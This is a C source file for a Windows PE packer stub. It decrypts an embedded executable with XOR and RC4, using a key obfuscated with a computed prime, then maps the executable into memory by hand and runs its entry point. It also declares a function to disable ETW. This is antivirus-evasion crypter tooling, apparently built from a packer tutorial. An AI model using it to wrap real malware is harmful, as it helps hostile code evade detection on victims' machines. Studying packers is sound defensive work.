#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <psapi.h>

#define KEY_LENGTH 16 // 128 bits
#define PRIME_LENGTH 8 // 64 bits
#define PRIME_TOP 60124

// https://wirediver.com/tutorial-writing-a-pe-packer-part-2/

// Declarations
void* load_PE (char* PE_data);
int decrypt_elf(unsigned char *elf_buf, size_t file_size, unsigned char *key, size_t key_size);
void disableETW(void);


// int _start(void) {

//     // Get the current module VA (ie PE header addr)
//     char* unpacker_VA = (char*) GetModuleHandleA(NULL);

//     // get to the section header
//     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) unpacker_VA;
//     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
//     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);

//     char* packed_PE = NULL;
//     char packed_section_name[] = ".packed";

//     // search for the ".packed" section
//     for(int i=0; i<p_NT_HDR->FileHeader.NumberOfSections; ++i) {
//         if (mystrcmp(sections[i].Name, packed_section_name)) {
//             packed_PE = unpacker_VA + sections[i].VirtualAddress;
//             break;
//         }
//     }

//     //load the data located at the .packed section
//     if(packed_PE != NULL) {
//         void (*packed_entry_point)(void) = (void(*)()) load_PE(packed_PE);
//         packed_entry_point();
//     }
// }

int main(int argc, char** argv) {
     if (argc > 1) {
        printf("Usage: %s\n", argv[0]);
        return 1;
    }

    FILE* loader_file = fopen(argv[0], "rb");
    if (loader_file == NULL) {
        perror("Failed to fopen loader PE file");
        return 1;
    }

    // Get file size
    fseek(loader_file, 0L, SEEK_END);
    long int loader_file_size = ftell(loader_file);
    fseek(loader_file, 0L, SEEK_SET);

    if (fseek(loader_file, -48L, SEEK_END) != 0) {
        perror("Failed to seek to end of file");
        return 1;
    }
    // Read the last 8 bytes
    char size_buffer[48]; // 8 byte loader_size + 8 byte encrypted_size + 32 byte ascii key string
    size_t read_size = fread(size_buffer, 1, sizeof(size_buffer), loader_file);
    if (read_size != sizeof(size_buffer)) {
        perror("Failed to read file");
        return 1;
    }
    fseek(loader_file, 0L, SEEK_SET);

    size_t loader_size = *(int64_t*)(size_buffer);
    size_t encrypted_size = *(int64_t*)(size_buffer+8);
    char *key_hexstring = (size_buffer+16);
    printf("Loader size: %i\n", loader_size);
    printf("Encrypted size: %i\n", encrypted_size);
    printf("Loader file size: %i\n", loader_file_size);
    printf("Obfuscated Decode key: %s\n", key_hexstring);

    // Allocate memory and read the whole file
    char* pe_buf = malloc(encrypted_size);

    // Read file
    fseek(loader_file, loader_size, SEEK_SET);
    size_t l_n_read = fread(pe_buf, 1, encrypted_size, loader_file);
    if(l_n_read != encrypted_size) {
        printf("reading error (%d)\n", l_n_read);
        return 1;
    }

    // Get key from input and decode to byte array
    const char *pos = key_hexstring;
    unsigned char key[KEY_LENGTH];

    for (size_t count = 0; count < sizeof key/sizeof *key; count++) {
        sscanf(pos, "%2hhx", &key[count]);
        pos += 2;
    }

    printf("Decrypt PE\n");
    decrypt_PE(pe_buf, encrypted_size, key);

    printf("Load PE\n");
    // Load the PE into memory
    void* start_address = load_PE(pe_buf);

    printf("Starting PE\n");
    if(start_address) {
        // call its entry point
        ((void (*)(void)) start_address)();
    }

    return 0;
}

void* load_PE (char* PE_data) {
    // DEFINITIONS OF HEADERS AND CO.
    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) PE_data;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1); 

    // Get header information for loading
    DWORD hdr_image_base = p_NT_HDR->OptionalHeader.ImageBase;
    DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
    DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
    DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
    WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;

    printf("hdr_image_base:%i\nsize_of_image:%i\nentry_point_RVA:%i\nsize_of_headers:%i\nnum_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);

    char* image_base = (char*)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(image_base == NULL) return NULL; // allocation didn't work

    printf("Copy PE section wise into memory\n");
    // COPY HEADERS TO MEMORY
    memcpy(image_base, PE_data, size_of_headers);
    // Copy PE section wise into memory
    for (int i = 0; i < num_of_sections; ++i) {
        // calculate the Virtual Address we need to copy the content, from the Relative Virtual Address 
        // section[i].VirtualAddress is a Relative Virtual Address
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD raw_data_size = sections[i].SizeOfRawData;

        // check if there is raw data to copy
        if (raw_data_size > 0) {
            // We copy SizeOfRawData bytes, from the offset PointerToRawData in the file
            memcpy(dest_addr, PE_data + sections[i].PointerToRawData, raw_data_size);
        } else {
            memset(dest_addr, 0, sections[i].Misc.VirtualSize);
        }
    }

    printf("Handle Import Table\n");

    // IMPORT TABLE
    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;

    // load the address of the import descriptors array
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // this array is null terminated
    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {

        // Get the name of the dll, and import it
        char* module_name = image_base + import_descriptors[i].Name;
        HMODULE import_module = LoadLibraryA(module_name);
        printf("Module Name: %s\n", module_name);
        
        if (import_module == NULL) {
            printf("Import Module could not be found %s, continue...\n", module_name);
            continue;
        }

        // the lookup table points to function names or ordinals => it is the IDT
        IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].OriginalFirstThunk);

        // the address table is a copy of the lookup table at first
        // but we put the addresses of the loaded function inside => that's the IAT
        IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].FirstThunk);

        // null terminated array, again
        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void *function_handle = NULL;

            // Check the lookup table for the adresse of the function name to import
            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;

            if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME *)(image_base + lookup_addr);
                // this struct points to the ASCII function name
                char *funct_name = (char *)&(image_import->Name);
                // get that function address from it's module and name
                function_handle = (void *)GetProcAddress(import_module, funct_name);
            } else {
                // import by ordinal, directly
                DWORD ordinal_num = lookup_addr & (~IMAGE_ORDINAL_FLAG);
                printf("Import by ordinal %u directly\n", ordinal_num);
                function_handle = (void *)GetProcAddress(import_module, MAKEINTRESOURCEA(lookup_addr));
            }

            if (function_handle == NULL) {
                printf("Function could not be found in module %s\n", module_name);
                continue;
            }

            // change the IAT, and put the function address inside.
            address_table[i].u1.Function = (DWORD)function_handle;
        }
    }

    printf("Handle Relocations\n");

    // RELOCATIONS
    // this is how much we shifted the ImageBase
    DWORD delta_VA_reloc = ((DWORD)image_base) - p_NT_HDR->OptionalHeader.ImageBase;

    // if there is a relocation table, and we actually shitfted the ImageBase
    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {

        //calculate the relocation table address
        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        //once again, a null terminated array
        while (p_reloc->VirtualAddress != 0) {

            // how many relocations in this block?
            // i.e. the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
            // the first relocation element in the block, right after the header (using pointer arithmetic again)
            WORD* reloc = (WORD*) (p_reloc + 1);
            for (int i = 0; i < size; ++i) {
                // type is the first 4 bits of the relocation word
                int type = reloc[i] >> 12;
                // offset is the last 12 bits
                int offset = reloc[i] & 0x0fff;
                // this is the address we are going to change
                DWORD* change_addr = (DWORD*) (image_base + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change
                switch(type) {
                    case IMAGE_REL_BASED_HIGHLOW :
                        *change_addr += delta_VA_reloc;
                        break;
                    default:
                        break;
                }
            }

            // switch to the next relocation block, based on the size
            p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
        }
    }

    // PERMISSIONS
    // Set permission for the PE header to read only
    DWORD old_protect;
    VirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);

    // Match permissions from headers
    for (int i = 0; i < num_of_sections; ++i) {
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD section_flags = sections[i].Characteristics;
        DWORD virtual_flags = 0;
        if(section_flags & IMAGE_SCN_MEM_EXECUTE) {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        }
        VirtualProtect(dest_addr, sections[i].Misc.VirtualSize, virtual_flags, &old_protect);
    }

    return (void*) (image_base + entry_point_RVA);
}


// ============= LOADER OBFUSCATION HERE =============



// =============== DEOBFUSCATION HERE ================

uint64_t prime_number(uint64_t n) {
    uint64_t last_prime = 0;
    for (uint64_t number = 0; number <= n; number++) {
        int prime = 1;
        for(uint64_t divisor = 2; divisor < number; divisor++) {
            if ((number % divisor) == 0) prime = 0;
        }
        if (prime) last_prime = number;
    }

    return last_prime;
}

void swap(unsigned char *a, unsigned char *b) {
    unsigned char temp = *a;
    *a = *b;
    *b = temp;
}

void rc4_init(unsigned char *s, unsigned char *key) {
    int i, j = 0;
    for (i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % KEY_LENGTH]) % 256;
        swap(&s[i], &s[j]);
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
    int i = 0, j = 0, k;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        swap(&s[i], &s[j]);
        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

int decrypt_PE(unsigned char *pe_buf, size_t file_size, unsigned char *key) {

    printf("Start prime calculation\n");
    uint64_t last_prime = prime_number(PRIME_TOP);
    uint8_t* prime_ptr = (uint8_t *)(&last_prime);
    printf("Last prime number: %llu\n", last_prime);
   
    // XOR decode key with prime 
    for (size_t i = 0; i < KEY_LENGTH; i++) {
        key[i] ^= prime_ptr[i % PRIME_LENGTH];
    }

    char hex_string[KEY_LENGTH * 2 + 1];
    for (int i = 0; i < KEY_LENGTH; i++) {
        sprintf(&hex_string[i * 2], "%02x", key[i]);
    }
    printf("Deobfuscated Key: %s\n", hex_string);


    // Decode XOR
    for (size_t i = 0; i < file_size; i++) {
        pe_buf[i] ^= key[i % KEY_LENGTH];
    }

    unsigned char s[256];
    rc4_init(s, key);
    rc4_crypt(s, pe_buf, file_size);

    return 0;
}